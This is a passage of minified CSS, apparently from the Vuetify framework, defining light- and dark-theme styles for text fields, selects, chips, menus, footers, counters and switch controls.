fieldset{color:rgba(0,0,0,.26)}.theme--dark.v-text-field>.v-input__control>.v-input__slot:before{border-color:hsla(0,0%,100%,.7)}.theme--dark.v-text-field:not(.v-input--has-state):hover>.v-input__control>.v-input__slot:before{border-color:#fff}.theme--dark.v-text-field.v-input--is-disabled .v-input__slot:before{-o-border-image:repeating-linear-gradient(90deg,hsla(0,0%,100%,.5) 0,hsla(0,0%,100%,.5) 2px,transparent 0,transparent 4px) 1 repeat;border-image:repeating-linear-gradient(90deg,hsla(0,0%,100%,.5) 0,hsla(0,0%,100%,.5) 2px,transparent 0,transparent 4px) 1 repeat}.theme--dark.v-text-field--filled>.v-input__control>.v-input__slot{background:hsla(0,0%,100%,.08)}.theme--dark.v-text-field--filled:not(.v-input--is-focused):not(.v-input--has-state)>.v-input__control>.v-input__slot:hover{background:hsla(0,0%,100%,.16)}.theme--dark.v-text-field--solo>.v-input__control>.v-input__slot{background:#1e1e1e}.theme--dark.v-text-field--solo-inverted>.v-input__control>.v-input__slot{background:hsla(0,0%,100%,.16)}.theme--dark.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot{background:#fff}.theme--dark.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot input{color:rgba(0,0,0,.87)}.theme--dark.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot input::-moz-placeholder{color:rgba(0,0,0,.38)}.theme--dark.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot input:-ms-input-placeholder{color:rgba(0,0,0,.38)}.theme--dark.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot input::placeholder{color:rgba(0,0,0,.38)}.theme--dark.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot .v-label{color:rgba(0,0,0,.6)}.theme--dark.v-text-field--outlined:not(.v-input--is-focused):not(.v-input--has-state)>.v-input__control>.v-input__slot fieldset{color:hsla(0,0%,100%,.24)}.theme--dark.v-text-field--outlined:not(.v-input--is-focused):not(.v-input--has-state):not(.v-input--is-disabled)>.v-input__control>.v-input__slot:hover fieldset{color:#fff}.theme--dark.v-text-field--outlined:not(.v-input--is-focused).v-input--is-disabled>.v-input__control>.v-input__slot fieldset{color:hsla(0,0%,100%,.16)}.v-text-field{padding-top:12px;margin-top:4px}.v-text-field input{flex:1 1 auto;line-height:20px;padding:8px 0;max-width:100%;min-width:0;width:100%}.v-text-field .v-input__control,.v-text-field .v-input__slot,.v-text-field fieldset{border-radius:inherit}.v-text-field.v-input--has-state .v-input__control>.v-text-field__details>.v-counter,.v-text-field.v-input--is-disabled .v-input__control>.v-text-field__details>.v-counter,.v-text-field.v-input--is-disabled .v-input__control>.v-text-field__details>.v-messages,.v-text-field .v-input__control,.v-text-field fieldset{color:inherit}.v-text-field.v-input--dense{padding-top:0}.v-text-field.v-input--dense:not(.v-text-field--outlined) input{padding:4px 0 2px}.v-text-field.v-input--dense[type=text]::-ms-clear{display:none}.v-text-field.v-input--dense .v-input__append-inner,.v-text-field.v-input--dense .v-input__prepend-inner{margin-top:0}.v-text-field.v-input--dense:not(.v-text-field--enclosed):not(.v-text-field--full-width) .v-input__append-inner .v-input__icon>.v-icon,.v-text-field.v-input--dense:not(.v-text-field--enclosed):not(.v-text-field--full-width) .v-input__prepend-inner .v-input__icon>.v-icon{margin-top:8px}.v-text-field .v-input__append-inner,.v-text-field .v-input__prepend-inner{align-self:flex-start;display:inline-flex;margin-top:4px;line-height:1;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-application--is-ltr .v-text-field .v-input__prepend-inner{margin-right:auto;padding-right:4px}.v-application--is-ltr .v-text-field .v-input__append-inner,.v-application--is-rtl .v-text-field .v-input__prepend-inner{margin-left:auto;padding-left:4px}.v-application--is-rtl .v-text-field .v-input__append-inner{margin-right:auto;padding-right:4px}.v-text-field .v-counter{white-space:nowrap}.v-application--is-ltr .v-text-field .v-counter{margin-left:8px}.v-application--is-rtl .v-text-field .v-counter{margin-right:8px}.v-text-field .v-label{max-width:90%;overflow:hidden;text-overflow:ellipsis;top:6px;white-space:nowrap;pointer-events:none}.v-application--is-ltr .v-text-field .v-label{transform-origin:top left}.v-application--is-rtl .v-text-field .v-label{transform-origin:top right}.v-text-field .v-label--active{max-width:133%;transform:translateY(-18px) scale(.75)}.v-text-field>.v-input__control>.v-input__slot{cursor:text;transition:background .3s cubic-bezier(.25,.8,.5,1)}.v-text-field>.v-input__control>.v-input__slot:after,.v-text-field>.v-input__control>.v-input__slot:before{bottom:-1px;content:"";left:0;position:absolute;transition:.3s cubic-bezier(.25,.8,.5,1);width:100%}.v-text-field>.v-input__control>.v-input__slot:before{border-color:inherit;border-style:solid;border-width:thin 0 0}.v-text-field>.v-input__control>.v-input__slot:after{border-color:currentcolor;border-style:solid;border-width:thin 0;transform:scaleX(0)}.v-text-field__details{display:flex;flex:1 0 auto;max-width:100%;min-height:14px;overflow:hidden}.v-text-field__prefix,.v-text-field__suffix{align-self:center;cursor:default;transition:color .3s cubic-bezier(.25,.8,.5,1);white-space:nowrap}.v-application--is-ltr .v-text-field__prefix{text-align:right;padding-right:4px}.v-application--is-rtl .v-text-field__prefix{text-align:left;padding-left:4px}.v-text-field__suffix{white-space:nowrap}.v-application--is-ltr .v-text-field__suffix{padding-left:4px}.v-application--is-rtl .v-text-field__suffix{padding-right:4px}.v-application--is-ltr .v-text-field--reverse .v-text-field__prefix{text-align:left;padding-right:0;padding-left:4px}.v-application--is-rtl .v-text-field--reverse .v-text-field__prefix{text-align:right;padding-right:4px;padding-left:0}.v-application--is-ltr .v-text-field--reverse .v-text-field__suffix{padding-left:0;padding-right:4px}.v-application--is-rtl .v-text-field--reverse .v-text-field__suffix{padding-left:4px;padding-right:0}.v-text-field>.v-input__control>.v-input__slot>.v-text-field__slot{display:flex;flex:1 1 auto;position:relative}.v-text-field:not(.v-text-field--is-booted) .v-label,.v-text-field:not(.v-text-field--is-booted) legend{transition:none}.v-text-field--filled,.v-text-field--full-width,.v-text-field--outlined{position:relative}.v-text-field--filled>.v-input__control>.v-input__slot,.v-text-field--full-width>.v-input__control>.v-input__slot,.v-text-field--outlined>.v-input__control>.v-input__slot{align-items:stretch;min-height:56px}.v-text-field--filled.v-input--dense>.v-input__control>.v-input__slot,.v-text-field--full-width.v-input--dense>.v-input__control>.v-input__slot,.v-text-field--outlined.v-input--dense>.v-input__control>.v-input__slot{min-height:52px}.v-text-field--filled.v-input--dense.v-text-field--outlined.v-text-field--filled>.v-input__control>.v-input__slot,.v-text-field--filled.v-input--dense.v-text-field--outlined>.v-input__control>.v-input__slot,.v-text-field--filled.v-input--dense.v-text-field--single-line>.v-input__control>.v-input__slot,.v-text-field--full-width.v-input--dense.v-text-field--outlined.v-text-field--filled>.v-input__control>.v-input__slot,.v-text-field--full-width.v-input--dense.v-text-field--outlined>.v-input__control>.v-input__slot,.v-text-field--full-width.v-input--dense.v-text-field--single-line>.v-input__control>.v-input__slot,.v-text-field--outlined.v-input--dense.v-text-field--outlined.v-text-field--filled>.v-input__control>.v-input__slot,.v-text-field--outlined.v-input--dense.v-text-field--outlined>.v-input__control>.v-input__slot,.v-text-field--outlined.v-input--dense.v-text-field--single-line>.v-input__control>.v-input__slot{min-height:40px}.v-text-field--outlined{border-radius:4px}.v-text-field--enclosed .v-input__append-inner,.v-text-field--enclosed .v-input__append-outer,.v-text-field--enclosed .v-input__prepend-inner,.v-text-field--enclosed .v-input__prepend-outer,.v-text-field--full-width .v-input__append-inner,.v-text-field--full-width .v-input__append-outer,.v-text-field--full-width .v-input__prepend-inner,.v-text-field--full-width .v-input__prepend-outer{margin-top:17px}.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo) .v-input__append-inner,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo) .v-input__append-outer,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo) .v-input__prepend-inner,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo) .v-input__prepend-outer,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo) .v-input__append-inner,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo) .v-input__append-outer,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo) .v-input__prepend-inner,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo) .v-input__prepend-outer{margin-top:14px}.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo).v-text-field--single-line .v-input__append-inner,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo).v-text-field--single-line .v-input__append-outer,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo).v-text-field--single-line .v-input__prepend-inner,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo).v-text-field--single-line .v-input__prepend-outer,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo).v-text-field--single-line .v-input__append-inner,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo).v-text-field--single-line .v-input__append-outer,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo).v-text-field--single-line .v-input__prepend-inner,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo).v-text-field--single-line .v-input__prepend-outer{margin-top:9px}.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo).v-text-field--outlined .v-input__append-inner,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo).v-text-field--outlined .v-input__append-outer,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo).v-text-field--outlined .v-input__prepend-inner,.v-text-field--enclosed.v-input--dense:not(.v-text-field--solo).v-text-field--outlined .v-input__prepend-outer,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo).v-text-field--outlined .v-input__append-inner,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo).v-text-field--outlined .v-input__append-outer,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo).v-text-field--outlined .v-input__prepend-inner,.v-text-field--full-width.v-input--dense:not(.v-text-field--solo).v-text-field--outlined .v-input__prepend-outer{margin-top:8px}.v-text-field--filled .v-label,.v-text-field--full-width .v-label{top:18px}.v-text-field--filled .v-label--active,.v-text-field--full-width .v-label--active{transform:translateY(-6px) scale(.75)}.v-text-field--filled.v-input--dense .v-label,.v-text-field--full-width.v-input--dense .v-label{top:17px}.v-text-field--filled.v-input--dense .v-label--active,.v-text-field--full-width.v-input--dense .v-label--active{transform:translateY(-10px) scale(.75)}.v-text-field--filled.v-input--dense.v-text-field--single-line .v-label,.v-text-field--full-width.v-input--dense.v-text-field--single-line .v-label{top:11px}.v-text-field--filled{border-radius:4px 4px 0 0}.v-text-field--filled:not(.v-text-field--single-line) input{margin-top:22px}.v-text-field--filled.v-input--dense:not(.v-text-field--single-line).v-text-field--outlined input{margin-top:0}.v-text-field--filled .v-text-field__prefix,.v-text-field--filled .v-text-field__suffix{max-height:32px;margin-top:20px}.v-text-field--full-width{border-radius:0}.v-text-field--outlined .v-text-field__slot,.v-text-field--single-line .v-text-field__slot{align-items:center}.v-text-field.v-text-field--enclosed{margin:0;padding:0}.v-text-field.v-text-field--enclosed.v-text-field--single-line .v-text-field__prefix,.v-text-field.v-text-field--enclosed.v-text-field--single-line .v-text-field__suffix{margin-top:0}.v-text-field.v-text-field--enclosed:not(.v-text-field--filled) .v-progress-linear__background{display:none}.v-text-field.v-text-field--enclosed .v-text-field__details,.v-text-field.v-text-field--enclosed:not(.v-text-field--rounded)>.v-input__control>.v-input__slot{padding:0 12px}.v-text-field.v-text-field--enclosed .v-text-field__details{margin-bottom:8px}.v-application--is-ltr .v-text-field--reverse input{text-align:right}.v-application--is-rtl .v-text-field--reverse input{text-align:left}.v-application--is-ltr .v-text-field--reverse .v-label{transform-origin:top right}.v-application--is-rtl .v-text-field--reverse .v-label{transform-origin:top left}.v-text-field--reverse .v-text-field__slot,.v-text-field--reverse>.v-input__control>.v-input__slot{flex-direction:row-reverse}.v-text-field--outlined>.v-input__control>.v-input__slot:after,.v-text-field--outlined>.v-input__control>.v-input__slot:before,.v-text-field--rounded>.v-input__control>.v-input__slot:after,.v-text-field--rounded>.v-input__control>.v-input__slot:before,.v-text-field--solo>.v-input__control>.v-input__slot:after,.v-text-field--solo>.v-input__control>.v-input__slot:before{display:none}.v-text-field--outlined,.v-text-field--solo{border-radius:4px}.v-text-field--outlined{margin-bottom:16px;transition:border .3s cubic-bezier(.25,.8,.5,1)}.v-text-field--outlined .v-label{top:18px}.v-text-field--outlined .v-label--active{transform:translateY(-24px) scale(.75)}.v-text-field--outlined.v-input--dense .v-label{top:10px}.v-text-field--outlined.v-input--dense .v-label--active{transform:translateY(-16px) scale(.75)}.v-text-field--outlined fieldset{border-collapse:collapse;border:1px solid;bottom:0;left:0;pointer-events:none;position:absolute;right:0;top:-5px;transition-duration:.3s;transition-property:color,border-width;transition-timing-function:cubic-bezier(.25,.8,.25,1)}.v-application--is-ltr .v-text-field--outlined fieldset{padding-left:8px}.v-application--is-ltr .v-text-field--outlined.v-text-field--reverse fieldset,.v-application--is-rtl .v-text-field--outlined fieldset{padding-right:8px}.v-application--is-rtl .v-text-field--outlined.v-text-field--reverse fieldset{padding-left:8px}.v-text-field--outlined legend{line-height:11px;padding:0;transition:width .3s cubic-bezier(.25,.8,.5,1)}.v-application--is-ltr .v-text-field--outlined legend{text-align:left}.v-application--is-ltr .v-text-field--outlined.v-text-field--reverse legend,.v-application--is-rtl .v-text-field--outlined legend{text-align:right}.v-application--is-rtl .v-text-field--outlined.v-text-field--reverse legend{text-align:left}.v-application--is-ltr .v-text-field--outlined.v-text-field--rounded legend{margin-left:12px}.v-application--is-rtl .v-text-field--outlined.v-text-field--rounded legend{margin-right:12px}.v-text-field--outlined>.v-input__control>.v-input__slot{background:transparent}.v-text-field--outlined .v-text-field__prefix{max-height:32px}.v-text-field--outlined .v-input__append-outer,.v-text-field--outlined .v-input__prepend-outer{margin-top:18px}.v-text-field--outlined.v-input--has-state fieldset,.v-text-field--outlined.v-input--is-focused fieldset{border:2px solid}.v-text-field--rounded{border-radius:28px}.v-text-field--rounded>.v-input__control>.v-input__slot{padding:0 24px}.v-text-field--shaped{border-radius:16px 16px 0 0}.v-text-field.v-text-field--solo .v-label{top:calc(50% - 9px)}.v-text-field.v-text-field--solo .v-input__control{min-height:48px;padding:0}.v-text-field.v-text-field--solo .v-input__control input{caret-color:auto}.v-text-field.v-text-field--solo.v-input--dense>.v-input__control{min-height:38px}.v-text-field.v-text-field--solo:not(.v-text-field--solo-flat)>.v-input__control>.v-input__slot{box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}.v-text-field.v-text-field--solo .v-input__append-inner,.v-text-field.v-text-field--solo .v-input__prepend-inner{align-self:center;margin-top:0}.v-text-field.v-text-field--solo .v-input__append-outer,.v-text-field.v-text-field--solo .v-input__prepend-outer{margin-top:12px}.v-text-field.v-text-field--solo.v-input--dense .v-input__append-outer,.v-text-field.v-text-field--solo.v-input--dense .v-input__prepend-outer{margin-top:7px}.v-text-field.v-input--is-focused>.v-input__control>.v-input__slot:after{transform:scaleX(1)}.v-text-field.v-input--has-state>.v-input__control>.v-input__slot:before{border-color:currentColor}
.theme--light.v-counter{color:rgba(0,0,0,.6)}.theme--dark.v-counter{color:hsla(0,0%,100%,.7)}.v-counter{flex:0 1 auto;font-size:12px;min-height:12px;line-height:12px}
.theme--light.v-subheader{color:rgba(0,0,0,.6)}.theme--dark.v-subheader{color:hsla(0,0%,100%,.7)}.v-subheader{align-items:center;display:flex;height:48px;font-size:.875rem;font-weight:400;padding:0 16px}.v-subheader--inset{margin-left:56px}
.theme--light.v-footer{background-color:#f5f5f5;color:rgba(0,0,0,.87)}.theme--dark.v-footer{background-color:#272727;color:#fff}.v-sheet.v-footer{border-radius:0}.v-sheet.v-footer:not(.v-sheet--outlined){box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)}.v-sheet.v-footer.v-sheet--shaped{border-radius:24px 0}.v-footer{align-items:center;display:flex;flex:0 1 auto!important;flex-wrap:wrap;padding:6px 16px;position:relative;transition-duration:.2s;transition-property:background-color,left,right;transition-timing-function:cubic-bezier(.4,0,.2,1)}.v-footer:not([data-booted=true]){transition:none!important}.v-footer--absolute,.v-footer--fixed{z-index:3}.v-footer--absolute{position:absolute}.v-footer--absolute:not(.v-footer--inset){width:100%}.v-footer--fixed{position:fixed}.v-footer--padless{padding:0}
.theme--light.v-select .v-select__selection--comma{color:rgba(0,0,0,.87)}.theme--light.v-select .v-select__selection--disabled{color:rgba(0,0,0,.38)}.theme--dark.v-select .v-select__selection--comma,.theme--light.v-select.v-text-field--solo-inverted.v-input--is-focused .v-select__selection--comma{color:#fff}.theme--dark.v-select .v-select__selection--disabled{color:hsla(0,0%,100%,.5)}.theme--dark.v-select.v-text-field--solo-inverted.v-input--is-focused .v-select__selection--comma{color:rgba(0,0,0,.87)}.v-select{position:relative}.v-select:not(.v-select--is-multi).v-text-field--single-line .v-select__selections{flex-wrap:nowrap}.v-select>.v-input__control>.v-input__slot{cursor:pointer}.v-select .v-chip{flex:0 1 auto;margin:4px}.v-select .v-chip--selected:after{opacity:.22}.v-select .fade-transition-leave-active{position:absolute;left:0}.v-select.v-input--is-dirty ::-moz-placeholder{color:transparent!important}.v-select.v-input--is-dirty :-ms-input-placeholder{color:transparent!important}.v-select.v-input--is-dirty ::placeholder{color:transparent!important}.v-select:not(.v-input--is-dirty):not(.v-input--is-focused) .v-text-field__prefix{line-height:20px;top:7px;transition:.3s cubic-bezier(.25,.8,.5,1)}.v-select.v-text-field--enclosed:not(.v-text-field--single-line):not(.v-text-field--outlined) .v-select__selections{padding-top:20px}.v-select.v-text-field--outlined:not(.v-text-field--single-line) .v-select__selections{padding:8px 0}.v-select.v-text-field--outlined:not(.v-text-field--single-line).v-input--dense .v-select__selections{padding:4px 0}.v-select.v-text-field input{flex:1 1;margin-top:0;min-width:0;pointer-events:none;position:relative}.v-select.v-select--is-menu-active .v-input__icon--append .v-icon{transform:rotate(180deg)}.v-select.v-select--chips input{margin:0}.v-select.v-select--chips .v-select__selections{min-height:42px}.v-select.v-select--chips.v-input--dense .v-select__selections{min-height:40px}.v-select.v-select--chips .v-chip--select.v-chip--active:before{opacity:.2}.v-select.v-select--chips.v-select--chips--small .v-select__selections{min-height:26px}.v-select.v-select--chips:not(.v-text-field--single-line).v-text-field--box .v-select__selections,.v-select.v-select--chips:not(.v-text-field--single-line).v-text-field--enclosed .v-select__selections{min-height:68px}.v-select.v-select--chips:not(.v-text-field--single-line).v-text-field--box.v-input--dense .v-select__selections,.v-select.v-select--chips:not(.v-text-field--single-line).v-text-field--enclosed.v-input--dense .v-select__selections{min-height:40px}.v-select.v-select--chips:not(.v-text-field--single-line).v-text-field--box.v-select--chips--small .v-select__selections,.v-select.v-select--chips:not(.v-text-field--single-line).v-text-field--enclosed.v-select--chips--small .v-select__selections{min-height:26px}.v-select.v-select--chips:not(.v-text-field--single-line).v-text-field--box.v-select--chips--small.v-input--dense .v-select__selections,.v-select.v-select--chips:not(.v-text-field--single-line).v-text-field--enclosed.v-select--chips--small.v-input--dense .v-select__selections{min-height:38px}.v-select.v-text-field--reverse .v-select__selections,.v-select.v-text-field--reverse .v-select__slot{flex-direction:row-reverse}.v-select__selections{align-items:center;display:flex;flex:1 1;flex-wrap:wrap;line-height:18px;max-width:100%;min-width:0}.v-select__selection{max-width:90%}.v-select__selection--comma{margin:7px 4px 7px 0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.v-select.v-input--dense .v-select__selection--comma{margin:5px 4px 3px 0}.v-select.v-input--dense .v-chip{margin:0 4px}.v-select__slot{position:relative;align-items:center;display:flex;max-width:100%;min-width:0;width:100%}.v-select:not(.v-text-field--single-line):not(.v-text-field--outlined) .v-select__slot>input{align-self:flex-end}
.v-chip:not(.v-chip--outlined).accent,.v-chip:not(.v-chip--outlined).error,.v-chip:not(.v-chip--outlined).info,.v-chip:not(.v-chip--outlined).primary,.v-chip:not(.v-chip--outlined).secondary,.v-chip:not(.v-chip--outlined).success,.v-chip:not(.v-chip--outlined).warning{color:#fff}.theme--light.v-chip{border-color:rgba(0,0,0,.12);color:rgba(0,0,0,.87)}.theme--light.v-chip:not(.v-chip--active){background:#e0e0e0}.theme--light.v-chip:hover:before{opacity:.04}.theme--light.v-chip--active:before,.theme--light.v-chip--active:hover:before,.theme--light.v-chip:focus:before{opacity:.12}.theme--light.v-chip--active:focus:before{opacity:.16}.theme--dark.v-chip{border-color:hsla(0,0%,100%,.12);color:#fff}.theme--dark.v-chip:not(.v-chip--active){background:#555}.theme--dark.v-chip:hover:before{opacity:.08}.theme--dark.v-chip--active:before,.theme--dark.v-chip--active:hover:before,.theme--dark.v-chip:focus:before{opacity:.24}.theme--dark.v-chip--active:focus:before{opacity:.32}.v-chip{align-items:center;cursor:default;display:inline-flex;line-height:20px;max-width:100%;outline:none;overflow:hidden;padding:0 12px;position:relative;text-decoration:none;transition-duration:.28s;transition-property:box-shadow,opacity;transition-timing-function:cubic-bezier(.4,0,.2,1);vertical-align:middle;white-space:nowrap}.v-chip:before{background-color:currentColor;bottom:0;border-radius:inherit;content:"";left:0;opacity:0;position:absolute;pointer-events:none;right:0;top:0}.v-chip .v-avatar{height:24px!important;min-width:24px!important;width:24px!important}.v-chip .v-icon{font-size:24px}.v-application--is-ltr .v-chip .v-avatar--left,.v-application--is-ltr .v-chip .v-icon--left{margin-left:-6px;margin-right:6px}.v-application--is-ltr .v-chip .v-avatar--right,.v-application--is-ltr .v-chip .v-icon--right,.v-application--is-rtl .v-chip .v-avatar--left,.v-application--is-rtl .v-chip .v-icon--left{margin-left:6px;margin-right:-6px}.v-application--is-rtl .v-chip .v-avatar--right,.v-application--is-rtl .v-chip .v-icon--right{margin-left:-6px;margin-right:6px}.v-chip:not(.v-chip--no-color) .v-icon{color:inherit}.v-chip .v-chip__close.v-icon{font-size:18px;max-height:18px;max-width:18px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-application--is-ltr .v-chip .v-chip__close.v-icon.v-icon--right{margin-right:-4px}.v-application--is-rtl .v-chip .v-chip__close.v-icon.v-icon--right{margin-left:-4px}.v-chip .v-chip__close.v-icon:active,.v-chip .v-chip__close.v-icon:focus,.v-chip .v-chip__close.v-icon:hover{opacity:.72}.v-chip .v-chip__content{align-items:center;display:inline-flex;height:100%;max-width:100%}.v-chip--active .v-icon{color:inherit}.v-chip--link:before{transition:opacity .3s cubic-bezier(.25,.8,.5,1)}.v-chip--link:focus:before{opacity:.32}.v-chip--clickable{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-chip--clickable:active{box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}.v-chip--disabled{opacity:.4;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-chip__filter{max-width:24px}.v-chip__filter.v-icon{color:inherit}.v-chip__filter.expand-x-transition-enter,.v-chip__filter.expand-x-transition-leave-active{margin:0}.v-chip--pill .v-chip__filter{margin-right:0 16px 0 0}.v-chip--pill .v-avatar{height:32px!important;width:32px!important}.v-application--is-ltr .v-chip--pill .v-avatar--left{margin-left:-12px}.v-application--is-ltr .v-chip--pill .v-avatar--right,.v-application--is-rtl .v-chip--pill .v-avatar--left{margin-right:-12px}.v-application--is-rtl .v-chip--pill .v-avatar--right{margin-left:-12px}.v-chip--label{border-radius:4px!important}.v-chip.v-chip--outlined{border-width:thin;border-style:solid}.v-chip.v-chip--outlined.v-chip--active:before{opacity:.08}.v-chip.v-chip--outlined .v-icon{color:inherit}.v-chip.v-chip--outlined.v-chip.v-chip{background-color:transparent!important}.v-chip.v-chip--selected{background:transparent}.v-chip.v-chip--selected:after{opacity:.28}.v-chip.v-size--x-small{border-radius:8px;font-size:10px;height:16px}.v-chip.v-size--small{border-radius:12px;font-size:12px;height:24px}.v-chip.v-size--default{border-radius:16px;font-size:14px;height:32px}.v-chip.v-size--large{border-radius:27px;font-size:16px;height:54px}.v-chip.v-size--x-large{border-radius:33px;font-size:18px;height:66px}
.v-menu{display:none}.v-menu--attached{display:inline}.v-menu__content{position:absolute;display:inline-block;max-width:80%;overflow-y:auto;overflow-x:hidden;contain:content;will-change:transform;box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12);border-radius:4px}.v-menu__content--active{pointer-events:none}.v-menu__content--auto .v-list-item{transition-property:transform,opacity;transition-duration:.3s;transition-timing-function:cubic-bezier(.25,.8,.25,1)}.v-menu__content--fixed{position:fixed}.v-menu__content>.card{contain:content;-webkit-backface-visibility:hidden;backface-visibility:hidden}.v-menu>.v-menu__content{max-width:none}.v-menu-transition-enter .v-list-item{min-width:0;pointer-events:none}.v-menu-transition-enter-to .v-list-item{transition-delay:.1s}.v-menu-transition-leave-active,.v-menu-transition-leave-to{pointer-events:none}.v-menu-transition-enter,.v-menu-transition-leave-to{opacity:0}.v-menu-transition-enter-active,.v-menu-transition-leave-active{transition:all .3s cubic-bezier(.25,.8,.25,1)}.v-menu-transition-enter.v-menu__content--auto{transition:none!important}.v-menu-transition-enter.v-menu__content--auto .v-list-item{opacity:0;transform:translateY(-15px)}.v-menu-transition-enter.v-menu__content--auto .v-list-item--active{opacity:1;transform:none!important;pointer-events:auto}
.v-simple-checkbox{align-self:center;line-height:normal;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer}.v-simple-checkbox--disabled{cursor:default}
.theme--light.v-input--switch .v-input--switch__thumb{color:#fff}.theme--light.v-input--switch .v-input--switch__track{color:rgba(0,0,0,.38)}.theme--light.v-input--switch.v-input--is-disabled:not(.v-input--is-dirty) .v-input--switch__thumb{color:#fafafa!important}.theme--light.v-input--switch.v-input--is-disabled:not(.v-input--is-dirty) .v-input--switch__track{color:rgba(0,0,0,.12)!important}.theme--dark.v-input--switch .v-input--switch__thumb{color:#bdbdbd}.theme--dark.v-input--switch .v-input--switch__track{color:hsla(0,0%,100%,.3)}.theme--dark.v-input--switch.v-input--is-disabled:not(.v-input--is-dirty) .v-input--switch__thumb{color:#424242!important}.theme--dark.v-input--switch.v-input--is-disabled:not(.v-input--is-dirty) .v-input--switch__track{color:hsla(0,0%,100%,.1)!important}.v-input--switch__thumb,.v-input--switch__track{background-color:currentColor;pointer-events:none;transition:inherit}.v-input--switch__track{border-radius:8px;width:36px;height:14px;left:2px;position:absolute;opacity:.6;right:2px;top:calc(50% - 7px)}.v-input--switch__thumb{border-radius:50%;top:calc(50% - 10px);height:20px;position:relative;width:20px;display:flex;justify-content:center;align-items:center;transition:.3s cubic-bezier(.25,.8,.5,1)}.v-input--switch .v-input--selection-controls__input{width:38px}.v-input--switch .v-input--selection-controls__ripple{top:calc(50% - 24px)}.v-input--switch.v-input--dense .v-input--switch__thumb{width:18px;height:18px}.v-input--switch.v-input--dense .v-input--switch__track{height:12px;width:32px}.v-input--switch.v-input--dense.v-input--switch--inset .v-input--switch__track{height:22px;width:44px;top:calc(50% - 12px);left:-3px}.v-input--switch.v-input--dense .v-input--selection-controls__ripple{top:calc(50% - 22px)}.v-input--switch.v-input--is-dirty.v-input--is-disabled{opacity:.6}.v-application--is-ltr .v-input--switch .v-input--selection-controls__ripple{left:-14px}.v-application--is-ltr .v-input--switch.v-input--dense .v-input--selection-controls__ripple{left:-12px}.v-application--is-ltr .v-input--switch.v-input--is-dirty .v-input--selection-controls__ripple,.v-application--is-ltr .v-input--switch.v-input--is-dirty .v-input--switch__thumb{transform:translate(20px)}.v-application--is-rtl .v-input--switch .v-input--selection-controls__ripple{right:-14px}.v-application--is-rtl .v-input--switch.v-input--dense .v-input--selection-controls__ripple{right:-12px}.v-application--is-rtl .v-input--switch.v-input--is-dirty .v-input--selection-controls__ripple,.v-application--is-rtl .v-input--switch.v-input--is-dirty .v-input--switch__thumb{transform:translate(-20px)}.v-input--switch:not(.v-input--switch--flat):not(.v-input--switch--inset) .v-input--switch__thumb{box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)}.v-input--switch--inset .v-input--selection-controls__input,.v-input--switch--inset .v-input--switch__track{width:48px}.v-input--switch--inset .v-input--switch__track{border-radius:14px;height:28px;left:-4px;opacity:.32;top:calc(50% - 14px)}.v-application--is-ltr .v-input--switch--inset .v-input--selection-controls__ripple,.v-application--is-ltr .v-input--switch--inset .v-input--switch__thumb{transform:translate(0)!important}.v-application--is-rtl .v-input--switch--inset .v-input--selection-controls__ripple,.v-application--is-rtl .v-input--switch--inset .v-input--switch__thumb{transform:translate(-6px)!important}.v-application--is-ltr .v-input--switch--inset.v-input--is-dirty .v-input--selection-controls__ripple,.v-application--is-ltr .v-input--switch--inset.v-input--is-dirty .v-input--switch__thumb{transform:translate(20px)!important}.v-application--is-rtl .v-input--switch--inset.v-input--is-dirty .v-input--selection-controls__ripple,.v-application--is-rtl .v-input--switch--inset.v-input--is-dirty .v-input--switch__thumb{transform:translate(-26px)!important}
